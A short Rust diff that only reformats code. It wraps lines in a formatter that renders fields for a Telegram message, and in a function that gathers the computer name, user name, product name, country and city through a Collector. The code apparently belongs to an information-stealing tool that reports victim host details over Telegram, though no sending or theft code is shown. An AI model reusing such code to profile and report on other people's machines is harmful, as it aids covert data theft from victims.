@@ -44,7 +44,11 @@ impl Display for TelegramBlockDisplay<'_> {
         let len = self.0.fields.len();
         for (i, field) in self.0.fields.iter().enumerate() {
             let prefix = if i == len - 1 { "└─" } else { "├─" };
-            writeln!(f, "<code>{}</code> {} {}: <code>{}</code>", prefix, field.emoji, field.name, field.value)?;
+            writeln!(
+                f,
+                "<code>{}</code> {} {}: <code>{}</code>",
+                prefix, field.emoji, field.name, field.value
+            )?;
         }
 
         Ok(())
@@ -60,7 +64,11 @@ where
     P: AsRef<str>,
     C: Collector,
 {
-    let PcInfo { computer_name, user_name, product_name } = PcInfo::retrieve();
+    let PcInfo {
+        computer_name,
+        user_name,
+        product_name,
+    } = PcInfo::retrieve();
     let IpInfo { country, city, .. } = unwrapped_ip_info();
 
     let caption = formatdoc! {r#"
